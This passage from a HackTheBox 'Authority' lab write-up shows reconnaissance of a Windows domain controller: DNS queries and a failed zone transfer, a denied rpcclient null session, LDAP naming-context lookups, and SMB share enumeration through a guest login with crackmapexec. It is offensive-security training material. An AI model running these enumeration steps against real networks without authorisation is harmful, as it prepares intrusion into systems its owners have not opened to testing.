<span class="o">|</span>     <span class="n">Connection</span><span class="p">:</span> <span class="n">close</span>
<span class="o">|</span>     <span class="o">&lt;</span><span class="n">html</span><span class="o">&gt;&lt;</span><span class="n">head</span><span class="o">&gt;&lt;</span><span class="n">meta</span> <span class="n">http</span><span class="o">-</span><span class="n">equiv</span><span class="o">=</span><span class="s2">"refresh"</span> <span class="n">content</span><span class="o">=</span><span class="s2">"0;URL='/pwm'"</span><span class="o">/&gt;&lt;/</span><span class="n">head</span><span class="o">&gt;&lt;/</span><span class="n">html</span><span class="o">&gt;</span>
<span class="o">|</span>   <span class="n">HTTPOptions</span><span class="p">:</span> 
<span class="o">|</span>     <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="mi">200</span> 
<span class="o">|</span>     <span class="n">Allow</span><span class="p">:</span> <span class="n">GET</span><span class="p">,</span> <span class="n">HEAD</span><span class="p">,</span> <span class="n">POST</span><span class="p">,</span> <span class="n">OPTIONS</span>
<span class="o">|</span>     <span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span> <span class="mi">0</span>
<span class="o">|</span>     <span class="n">Date</span><span class="p">:</span> <span class="n">Fri</span><span class="p">,</span> <span class="mi">08</span> <span class="n">Dec</span> <span class="mi">2023</span> <span class="mi">17</span><span class="p">:</span><span class="mi">45</span><span class="p">:</span><span class="mi">12</span> <span class="n">GMT</span>
<span class="o">|</span>     <span class="n">Connection</span><span class="p">:</span> <span class="n">close</span>
<span class="o">|</span>   <span class="n">RTSPRequest</span><span class="p">:</span> 
<span class="o">|</span>     <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="mi">400</span> 
<span class="o">|</span>     <span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">;</span><span class="n">charset</span><span class="o">=</span><span class="n">utf</span><span class="o">-</span><span class="mi">8</span>
<span class="o">|</span>     <span class="n">Content</span><span class="o">-</span><span class="n">Language</span><span class="p">:</span> <span class="n">en</span>
<span class="o">|</span>     <span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span> <span class="mi">1936</span>
<span class="o">|</span>     <span class="n">Date</span><span class="p">:</span> <span class="n">Fri</span><span class="p">,</span> <span class="mi">08</span> <span class="n">Dec</span> <span class="mi">2023</span> <span class="mi">17</span><span class="p">:</span><span class="mi">45</span><span class="p">:</span><span class="mi">21</span> <span class="n">GMT</span>
<span class="o">|</span>     <span class="n">Connection</span><span class="p">:</span> <span class="n">close</span>
<span class="o">|</span>     <span class="o">&lt;</span><span class="err">!</span><span class="n">doctype</span> <span class="n">html</span><span class="o">&gt;&lt;</span><span class="n">html</span> <span class="n">lang</span><span class="o">=</span><span class="s2">"en"</span><span class="o">&gt;&lt;</span><span class="n">head</span><span class="o">&gt;&lt;</span><span class="n">title</span><span class="o">&gt;</span><span class="n">HTTP</span> <span class="n">Status</span> <span class="mi">400</span> 
<span class="o">|</span>     <span class="n">Request</span><span class="o">&lt;/</span><span class="n">title</span><span class="o">&gt;&lt;</span><span class="n">style</span> <span class="nb">type</span><span class="o">=</span><span class="s2">"text/css"</span><span class="o">&gt;</span><span class="n">body</span> <span class="p">{</span><span class="n">font</span><span class="o">-</span><span class="n">family</span><span class="p">:</span><span class="n">Tahoma</span><span class="p">,</span><span class="n">Arial</span><span class="p">,</span><span class="n">sans</span><span class="o">-</span><span class="n">serif</span><span class="p">;}</span> <span class="n">h1</span><span class="p">,</span> <span class="n">h2</span><span class="p">,</span> <span class="n">h3</span><span class="p">,</span> <span class="n">b</span> <span class="p">{</span><span class="n">color</span><span class="p">:</span><span class="n">white</span><span class="p">;</span><span class="n">background</span><span class="o">-</span><span class="n">color</span><span class="p">:</span><span class="c1">#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 400 </span>
<span class="o">|</span><span class="n">_</span>    <span class="n">Request</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;&lt;</span><span class="n">hr</span> <span class="n">class</span><span class="o">=</span><span class="s2">"line"</span> <span class="o">/&gt;&lt;</span><span class="n">p</span><span class="o">&gt;&lt;</span><span class="n">b</span><span class="o">&gt;</span><span class="n">Type</span><span class="o">&lt;/</span><span class="n">b</span><span class="o">&gt;</span> <span class="ne">Exception</span> <span class="n">Report</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;&lt;</span><span class="n">p</span><span class="o">&gt;&lt;</span><span class="n">b</span><span class="o">&gt;</span><span class="n">Message</span><span class="o">&lt;/</span><span class="n">b</span><span class="o">&gt;</span> <span class="n">Invalid</span> <span class="n">character</span> <span class="n">found</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">HTTP</span> <span class="n">protocol</span> <span class="p">[</span><span class="n">RTSP</span><span class="o">&amp;</span><span class="c1">#47;1.00x0d0x0a0x0d0x0a...]&lt;/p&gt;&lt;p&gt;&lt;b&gt;Description&lt;/b&gt; The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid</span>
<span class="mi">9389</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">mc</span><span class="o">-</span><span class="n">nmf</span>        <span class="o">.</span><span class="n">NET</span> <span class="n">Message</span> <span class="n">Framing</span>
<span class="mi">47001</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>          <span class="n">Microsoft</span> <span class="n">HTTPAPI</span> <span class="n">httpd</span> <span class="mf">2.0</span> <span class="p">(</span><span class="n">SSDP</span><span class="o">/</span><span class="n">UPnP</span><span class="p">)</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">Not</span> <span class="n">Found</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span> <span class="n">Microsoft</span><span class="o">-</span><span class="n">HTTPAPI</span><span class="o">/</span><span class="mf">2.0</span>
<span class="mi">49664</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">msrpc</span>         <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
<span class="mi">49665</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">msrpc</span>         <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
<span class="mi">49666</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">msrpc</span>         <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
<span class="mi">49667</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">msrpc</span>         <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
<span class="mi">49675</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">msrpc</span>         <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
<span class="mi">49688</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ncacn_http</span>    <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span> <span class="n">over</span> <span class="n">HTTP</span> <span class="mf">1.0</span>
<span class="mi">49689</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">msrpc</span>         <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
<span class="mi">49691</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">msrpc</span>         <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
<span class="mi">49692</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">msrpc</span>         <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
<span class="mi">49701</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">msrpc</span>         <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
<span class="mi">49702</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">msrpc</span>         <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
<span class="mi">49711</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">msrpc</span>         <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
<span class="mi">49730</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">msrpc</span>         <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
<span class="n">Service</span> <span class="n">Info</span><span class="p">:</span> <span class="n">Host</span><span class="p">:</span> <span class="n">AUTHORITY</span><span class="p">;</span> <span class="n">OS</span><span class="p">:</span> <span class="n">Windows</span><span class="p">;</span> <span class="n">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">microsoft</span><span class="p">:</span><span class="n">windows</span>

<span class="n">Host</span> <span class="n">script</span> <span class="n">results</span><span class="p">:</span>
<span class="o">|</span> <span class="n">smb2</span><span class="o">-</span><span class="n">security</span><span class="o">-</span><span class="n">mode</span><span class="p">:</span> 
<span class="o">|</span>   <span class="mi">3</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span> 
<span class="o">|</span><span class="n">_</span>    <span class="n">Message</span> <span class="n">signing</span> <span class="n">enabled</span> <span class="ow">and</span> <span class="n">required</span>
<span class="o">|</span><span class="n">_clock</span><span class="o">-</span><span class="n">skew</span><span class="p">:</span> <span class="n">mean</span><span class="p">:</span> <span class="mi">3</span><span class="n">h59m59s</span><span class="p">,</span> <span class="n">deviation</span><span class="p">:</span> <span class="mi">0</span><span class="n">s</span><span class="p">,</span> <span class="n">median</span><span class="p">:</span> <span class="mi">3</span><span class="n">h59m59s</span>
<span class="o">|</span> <span class="n">smb2</span><span class="o">-</span><span class="n">time</span><span class="p">:</span> 
<span class="o">|</span>   <span class="n">date</span><span class="p">:</span> <span class="mi">2023</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">08</span><span class="n">T17</span><span class="p">:</span><span class="mi">46</span><span class="p">:</span><span class="mi">11</span>
<span class="o">|</span><span class="n">_</span>  <span class="n">start_date</span><span class="p">:</span> <span class="n">N</span><span class="o">/</span><span class="n">A</span>
</pre></div>

At first glance, we notice the <code>authority.htb</code> domain, which we will add to our <code>/etc/hosts</code> file:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">hosts</span>
<span class="mf">127.0.0.1</span>   <span class="n">localhost</span>
<span class="mf">127.0.1.1</span>   <span class="n">kali</span><span class="o">.</span><span class="n">localhost</span> <span class="n">kali</span>

<span class="c1"># The following lines are desirable for IPv6 capable hosts</span>
<span class="p">::</span><span class="mi">1</span>     <span class="n">localhost</span> <span class="n">ip6</span><span class="o">-</span><span class="n">localhost</span> <span class="n">ip6</span><span class="o">-</span><span class="n">loopback</span>
<span class="n">ff02</span><span class="p">::</span><span class="mi">1</span> <span class="n">ip6</span><span class="o">-</span><span class="n">allnodes</span>
<span class="n">ff02</span><span class="p">::</span><span class="mi">2</span> <span class="n">ip6</span><span class="o">-</span><span class="n">allrouters</span>

<span class="c1"># HackTheBox</span>
<span class="mf">10.10.11.222</span> <span class="n">authority</span><span class="o">.</span><span class="n">htb</span>
</pre></div>
<h3><br>DNS - Port 53</br></h3><br>
Let's perform DNS enumeration using the <code>dig</code> tool.<br/><br/>
<h3><br>Name Servers</br></h3><br>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">dig</span> <span class="o">@</span><span class="mf">10.10.11.222</span> <span class="n">authority</span><span class="o">.</span><span class="n">htb</span> <span class="n">ns</span>

<span class="p">;</span> <span class="o">&lt;&lt;&gt;&gt;</span> <span class="n">DiG</span> <span class="mf">9.19.17</span><span class="o">-</span><span class="mi">2</span><span class="o">~</span><span class="n">kali1</span><span class="o">-</span><span class="n">Kali</span> <span class="o">&lt;&lt;&gt;&gt;</span> <span class="o">@</span><span class="mf">10.10.11.222</span> <span class="n">authority</span><span class="o">.</span><span class="n">htb</span> <span class="n">ns</span>
<span class="p">;</span> <span class="p">(</span><span class="mi">1</span> <span class="n">server</span> <span class="n">found</span><span class="p">)</span>
<span class="p">;;</span> <span class="k">global</span> <span class="n">options</span><span class="p">:</span> <span class="o">+</span><span class="n">cmd</span>
<span class="p">;;</span> <span class="n">Got</span> <span class="n">answer</span><span class="p">:</span>
<span class="p">;;</span> <span class="o">-&gt;&gt;</span><span class="n">HEADER</span><span class="o">&lt;&lt;-</span> <span class="n">opcode</span><span class="p">:</span> <span class="n">QUERY</span><span class="p">,</span> <span class="n">status</span><span class="p">:</span> <span class="n">NOERROR</span><span class="p">,</span> <span class="nb">id</span><span class="p">:</span> <span class="mi">4710</span>
<span class="p">;;</span> <span class="n">flags</span><span class="p">:</span> <span class="n">qr</span> <span class="n">aa</span> <span class="n">rd</span> <span class="n">ra</span><span class="p">;</span> <span class="n">QUERY</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="n">ANSWER</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="n">AUTHORITY</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="n">ADDITIONAL</span><span class="p">:</span> <span class="mi">4</span>

<span class="p">;;</span> <span class="n">OPT</span> <span class="n">PSEUDOSECTION</span><span class="p">:</span>
<span class="p">;</span> <span class="n">EDNS</span><span class="p">:</span> <span class="n">version</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="n">flags</span><span class="p">:;</span> <span class="n">udp</span><span class="p">:</span> <span class="mi">4000</span>
<span class="p">;;</span> <span class="n">QUESTION</span> <span class="n">SECTION</span><span class="p">:</span>
<span class="p">;</span><span class="n">authority</span><span class="o">.</span><span class="n">htb</span><span class="o">.</span>          <span class="n">IN</span>   <span class="n">NS</span>

<span class="p">;;</span> <span class="n">ANSWER</span> <span class="n">SECTION</span><span class="p">:</span>
<span class="n">authority</span><span class="o">.</span><span class="n">htb</span><span class="o">.</span>      <span class="mi">3600</span>    <span class="n">IN</span>   <span class="n">NS</span>   <span class="n">authority</span><span class="o">.</span><span class="n">authority</span><span class="o">.</span><span class="n">htb</span><span class="o">.</span>

<span class="p">;;</span> <span class="n">ADDITIONAL</span> <span class="n">SECTION</span><span class="p">:</span>
<span class="n">authority</span><span class="o">.</span><span class="n">authority</span><span class="o">.</span><span class="n">htb</span><span class="o">.</span> <span class="mi">3600</span> <span class="n">IN</span>   <span class="n">A</span>    <span class="mf">10.10.11.222</span>
<span class="n">authority</span><span class="o">.</span><span class="n">authority</span><span class="o">.</span><span class="n">htb</span><span class="o">.</span> <span class="mi">3600</span> <span class="n">IN</span>   <span class="n">AAAA</span> <span class="n">dead</span><span class="p">:</span><span class="n">beef</span><span class="p">::</span><span class="n">f8</span>
<span class="n">authority</span><span class="o">.</span><span class="n">authority</span><span class="o">.</span><span class="n">htb</span><span class="o">.</span> <span class="mi">3600</span> <span class="n">IN</span>   <span class="n">AAAA</span> <span class="n">dead</span><span class="p">:</span><span class="n">beef</span><span class="p">::</span><span class="mi">664</span><span class="n">c</span><span class="p">:</span><span class="mi">1</span><span class="n">d0c</span><span class="p">:</span><span class="mi">319</span><span class="n">c</span><span class="p">:</span><span class="mi">924</span><span class="n">f</span>

<span class="p">;;</span> <span class="n">Query</span> <span class="n">time</span><span class="p">:</span> <span class="mi">192</span> <span class="n">msec</span>
<span class="p">;;</span> <span class="n">SERVER</span><span class="p">:</span> <span class="mf">10.10.11.222</span><span class="c1">#53(10.10.11.222) (UDP)</span>
<span class="p">;;</span> <span class="n">WHEN</span><span class="p">:</span> <span class="n">Fri</span> <span class="n">Dec</span> <span class="mi">08</span> <span class="mi">10</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">28</span> <span class="o">-</span><span class="mi">03</span> <span class="mi">2023</span>
<span class="p">;;</span> <span class="n">MSG</span> <span class="n">SIZE</span>  <span class="n">rcvd</span><span class="p">:</span> <span class="mi">138</span>
</pre></div>

We can identify the <code>authority.authority.htb</code> subdomain, which appears to point to the DC DNS server.<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">hosts</span>
<span class="mf">127.0.0.1</span>   <span class="n">localhost</span>
<span class="mf">127.0.1.1</span>   <span class="n">kali</span><span class="o">.</span><span class="n">localhost</span> <span class="n">kali</span>

<span class="c1"># The following lines are desirable for IPv6 capable hosts</span>
<span class="p">::</span><span class="mi">1</span>     <span class="n">localhost</span> <span class="n">ip6</span><span class="o">-</span><span class="n">localhost</span> <span class="n">ip6</span><span class="o">-</span><span class="n">loopback</span>
<span class="n">ff02</span><span class="p">::</span><span class="mi">1</span> <span class="n">ip6</span><span class="o">-</span><span class="n">allnodes</span>
<span class="n">ff02</span><span class="p">::</span><span class="mi">2</span> <span class="n">ip6</span><span class="o">-</span><span class="n">allrouters</span>

<span class="c1"># HackTheBox</span>
<span class="mf">10.10.11.222</span> <span class="n">authority</span><span class="o">.</span><span class="n">authority</span><span class="o">.</span><span class="n">htb</span> <span class="n">authority</span><span class="o">.</span><span class="n">htb</span>
</pre></div>
<h3><br>Zone Transfer Attack</br></h3><br>
Sometimes DNS servers are misconfigured. The DNS server typically holds a Zone file, which it uses to replicate the map of a domain. It should be configured so that only the authorized replicating DNS server can access it. However, misconfigurations can occur, allowing anyone to request the zone file and thereby receive the entire list of subdomains.<br/><br/>
This can be exploited as follows:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">dig</span> <span class="o">@</span><span class="mf">10.10.11.222</span> <span class="n">authority</span><span class="o">.</span><span class="n">htb</span> <span class="n">axfr</span>
<span class="p">;</span> <span class="o">&lt;&lt;&gt;&gt;</span> <span class="n">DiG</span> <span class="mf">9.19.17</span><span class="o">-</span><span class="mi">2</span><span class="o">~</span><span class="n">kali1</span><span class="o">-</span><span class="n">Kali</span> <span class="o">&lt;&lt;&gt;&gt;</span> <span class="o">@</span><span class="mf">10.10.11.222</span> <span class="n">authority</span><span class="o">.</span><span class="n">htb</span> <span class="n">axfr</span>
<span class="p">;</span> <span class="p">(</span><span class="mi">1</span> <span class="n">server</span> <span class="n">found</span><span class="p">)</span>
<span class="p">;;</span> <span class="k">global</span> <span class="n">options</span><span class="p">:</span> <span class="o">+</span><span class="n">cmd</span>
<span class="p">;</span> <span class="n">Transfer</span> <span class="n">failed</span><span class="o">.</span>
</pre></div>
<h3><br>RPC - Port 135</br></h3><br>
Through the RPC service, we might be able to enumerate valid users on the domain controller. This process may require credentials, but sometimes the NULL Session Authentication is available. Let's try connecting to the RPC service using the <code>rpcclient</code> tool:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">rpcclient</span> <span class="o">-</span><span class="n">U</span> <span class="s2">""</span> <span class="mf">10.10.11.222</span> <span class="o">-</span><span class="n">N</span>
<span class="n">rpcclient</span> <span class="err">$</span><span class="o">&gt;</span>
</pre></div>

While we successfully established a connection, it seems that access is denied when attempting to perform enumeration.<br/><br/>
<div class="highlight"><pre><span></span><span class="n">rpcclient</span> <span class="err">$</span><span class="o">&gt;</span> <span class="n">enumdomusers</span>
<span class="n">do_cmd</span><span class="p">:</span> <span class="n">Could</span> <span class="ow">not</span> <span class="n">initialise</span> <span class="n">samr</span><span class="o">.</span> <span class="n">Error</span> <span class="n">was</span> <span class="n">NT_STATUS_ACCESS_DENIED</span>
<span class="n">rpcclient</span> <span class="err">$</span><span class="o">&gt;</span> <span class="n">enumdomgroups</span>
<span class="n">do_cmd</span><span class="p">:</span> <span class="n">Could</span> <span class="ow">not</span> <span class="n">initialise</span> <span class="n">samr</span><span class="o">.</span> <span class="n">Error</span> <span class="n">was</span> <span class="n">NT_STATUS_ACCESS_DENIED</span>
<span class="n">rpcclient</span> <span class="err">$</span><span class="o">&gt;</span>
</pre></div>
<h3><br>LDAP - Port 389</br></h3><br>
The <code>ldapsearch</code> command will provide the base naming context, and it should match <code>authority.htb</code>:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">ldapsearch</span> <span class="o">-</span><span class="n">H</span> <span class="n">ldap</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.11.222</span><span class="o">/</span> <span class="o">-</span><span class="n">x</span> <span class="o">-</span><span class="n">s</span> <span class="n">base</span> <span class="n">namingcontexts</span>
<span class="c1"># extended LDIF</span>
<span class="c1">#</span>
<span class="c1"># LDAPv3</span>
<span class="c1"># base &lt;&gt; (default) with scope baseObject</span>
<span class="c1"># filter: (objectclass=*)</span>
<span class="c1"># requesting: namingcontexts </span>
<span class="c1">#</span>

<span class="c1">#</span>
<span class="n">dn</span><span class="p">:</span>
<span class="n">namingcontexts</span><span class="p">:</span> <span class="n">DC</span><span class="o">=</span><span class="n">authority</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">htb</span>
<span class="n">namingcontexts</span><span class="p">:</span> <span class="n">CN</span><span class="o">=</span><span class="n">Configuration</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">authority</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">htb</span>
<span class="n">namingcontexts</span><span class="p">:</span> <span class="n">CN</span><span class="o">=</span><span class="n">Schema</span><span class="p">,</span><span class="n">CN</span><span class="o">=</span><span class="n">Configuration</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">authority</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">htb</span>
<span class="n">namingcontexts</span><span class="p">:</span> <span class="n">DC</span><span class="o">=</span><span class="n">DomainDnsZones</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">authority</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">htb</span>
<span class="n">namingcontexts</span><span class="p">:</span> <span class="n">DC</span><span class="o">=</span><span class="n">ForestDnsZones</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">authority</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">htb</span>

<span class="c1"># search result</span>
<span class="n">search</span><span class="p">:</span> <span class="mi">2</span>
<span class="n">result</span><span class="p">:</span> <span class="mi">0</span> <span class="n">Success</span>

<span class="c1"># numResponses: 2</span>
<span class="c1"># numEntries: 1</span>
</pre></div>

Attempting to gather additional information requires authentication:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">ldapsearch</span> <span class="o">-</span><span class="n">H</span> <span class="n">ldap</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.11.222</span><span class="o">/</span> <span class="o">-</span><span class="n">x</span> <span class="o">-</span><span class="n">b</span> <span class="s1">'DC=authority,DC=htb'</span>
<span class="c1"># extended LDIF</span>
<span class="c1">#</span>
<span class="c1"># LDAPv3</span>
<span class="c1"># base &lt;DC=authority,DC=htb&gt; with scope subtree</span>
<span class="c1"># filter: (objectclass=*)</span>
<span class="c1"># requesting: ALL</span>
<span class="c1">#</span>

<span class="c1"># search result</span>
<span class="n">search</span><span class="p">:</span> <span class="mi">2</span>
<span class="n">result</span><span class="p">:</span> <span class="mi">1</span> <span class="n">Operations</span> <span class="n">error</span>
<span class="n">text</span><span class="p">:</span> <span class="mi">000004</span><span class="n">DC</span><span class="p">:</span> <span class="n">LdapErr</span><span class="p">:</span> <span class="n">DSID</span><span class="o">-</span><span class="mi">0</span><span class="n">C090ACD</span><span class="p">,</span> <span class="n">comment</span><span class="p">:</span> <span class="n">In</span> <span class="n">order</span> <span class="n">to</span> <span class="n">perform</span> <span class="n">this</span> <span class="n">opera</span>
 <span class="n">tion</span> <span class="n">a</span> <span class="n">successful</span> <span class="n">bind</span> <span class="n">must</span> <span class="n">be</span> <span class="n">completed</span> <span class="n">on</span> <span class="n">the</span> <span class="n">connection</span><span class="o">.</span><span class="p">,</span> <span class="n">data</span> <span class="mi">0</span><span class="p">,</span> <span class="n">v4563</span>

<span class="c1"># numResponses: 1</span>
</pre></div>
<h3><br>SMB - Port 445</br></h3><br>
We can perform enumeration of the <code>SMB</code> service using <code>crackmapexec</code>:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">crackmapexec</span> <span class="n">smb</span> <span class="mf">10.10.11.222</span>
<span class="n">SMB</span>         <span class="mf">10.10.11.222</span>    <span class="mi">445</span>    <span class="n">AUTHORITY</span>        <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="mf">10.0</span> <span class="n">Build</span> <span class="mi">17763</span> <span class="n">x64</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">AUTHORITY</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">authority</span><span class="o">.</span><span class="n">htb</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="p">:</span><span class="kc">True</span><span class="p">)</span> <span class="p">(</span><span class="n">SMBv1</span><span class="p">:</span><span class="kc">False</span><span class="p">)</span>
</pre></div>

Additionally, we can enumerate the <code>SMB Shares</code>. An <code>SMB share</code> is essentially a folder or space on a network that can be shared with others, facilitating the exchange of files between computers.<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">crackmapexec</span> <span class="n">smb</span> <span class="mf">10.10.11.222</span> <span class="o">--</span><span class="n">shares</span> 
<span class="n">SMB</span>         <span class="mf">10.10.11.222</span>    <span class="mi">445</span>    <span class="n">AUTHORITY</span>        <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="mf">10.0</span> <span class="n">Build</span> <span class="mi">17763</span> <span class="n">x64</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">AUTHORITY</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">authority</span><span class="o">.</span><span class="n">htb</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="p">:</span><span class="kc">True</span><span class="p">)</span> <span class="p">(</span><span class="n">SMBv1</span><span class="p">:</span><span class="kc">False</span><span class="p">)</span>
<span class="n">SMB</span>         <span class="mf">10.10.11.222</span>    <span class="mi">445</span>    <span class="n">AUTHORITY</span>        <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Error</span> <span class="n">enumerating</span> <span class="n">shares</span><span class="p">:</span> <span class="n">STATUS_USER_SESSION_DELETED</span>
</pre></div>

Returns <code>STATUS_USER_SESSION_DELETED</code>. This could be due to the <code>NULL Session</code> being disabled. Instead of utilizing a <code>NULL Session</code>, we can attempt to use a <code>Guest Session</code> by specifying only one username:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">crackmapexec</span> <span class="n">smb</span> <span class="mf">10.10.11.222</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'elswix'</span> <span class="o">-</span><span class="n">p</span> <span class="s1">''</span> <span class="o">--</span><span class="n">shares</span> 
<span class="n">SMB</span>         <span class="mf">10.10.11.222</span>    <span class="mi">445</span>    <span class="n">AUTHORITY</span>        <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="mf">10.0</span> <span class="n">Build</span> <span class="mi">17763</span> <span class="n">x64</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">AUTHORITY</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">authority</span><span class="o">.</span><span class="n">htb</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="p">:</span><span class="kc">True</span><span class="p">)</span> <span class="p">(</span><span class="n">SMBv1</span><span class="p">:</span><span class="kc">False</span><span class="p">)</span>
<span class="n">SMB</span>         <span class="mf">10.10.11.222</span>    <span class="mi">445</span>    <span class="n">AUTHORITY</span>        <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">authority</span><span class="o">.</span><span class="n">htb</span>\<span class="n">elswix</span><span class="p">:</span> 
<span class="n">SMB</span>         <span class="mf">10.10.11.222</span>    <span class="mi">445</span>    <span class="n">AUTHORITY</span>        <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Enumerated</span> <span class="n">shares</span>
<span class="n">SMB</span>         <span class="mf">10.10.11.222</span>    <span class="mi">445</span>    <span class="n">AUTHORITY</span>        <span class="n">Share</span>           <span class="n">Permissions</span>     <span class="n">Remark</span>
<span class="n">SMB</span>         <span class="mf">10.10.11.222</span>    <span class="mi">445</span>    <span class="n">AUTHORITY</span>        <span class="o">-----</span>           <span class="o">-----------</span>     <span class="o">------</span>
<span class="n">SMB</span>         <span class="mf">10.10.11.222</span>    <span class="mi">445</span>    <span class="n">AUTHORITY</span>        <span class="n">ADMIN</span><span class="err">$</span>                          <span class="n">Remote</span> <span class="n">Admin</span>
<span class="n">SMB</span>         <span class="mf">10.10.11.222</span>    <span class="mi">445</span>    <span class="n">AUTHORITY</span>        <span class="n">C</span><span class="err">$</span>                              <span class="n">Default</span> <span class="n">share</span>
